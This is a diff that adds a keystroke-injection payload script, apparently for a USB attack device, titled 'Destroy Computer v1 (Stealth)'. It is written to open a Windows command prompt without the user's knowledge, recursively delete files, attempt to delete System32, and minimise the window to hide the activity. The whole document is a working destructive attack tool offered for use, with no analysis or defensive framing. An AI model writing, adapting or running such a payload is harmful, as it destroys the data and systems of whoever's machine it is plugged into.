@@ -1,0 +1,32 @@
+REM Destroy Computer v1 (Stealth)
+REM Works only on Windows 10
+REM By: The_Typhoon1
+REM -------------------------------------------------------------------------
+REM Steps: 
+REM 1. Opens CMD
+REM 2. Delets all files
+REM 3. Deletes System 32 
+REM 4. Minimises CMD window
+REM -------------------------------------------------------------------------
+REM Important:
+REM When LED is red it is running code
+REM When LED is Green you can unplug it as it has finished running code.
+REM -------------------------------------------------------------------------
+REM Note: This is probably the better option out of loud and silent
+REM -------------------------------------------------------------------------
+ATTACKMODE HID
+LED_R
+DELAY 1000
+GUI r
+DELAY 850
+STRINGLN CMD
+DELAY 1500
+STRINGLN del /s /q “.”
+DELAY 100
+STRINGLN del system32 /s /f
+DELAY 100
+GUI DOWN
+DELAY 200
+GUI DOWN
+DELAY 100
+LED_G
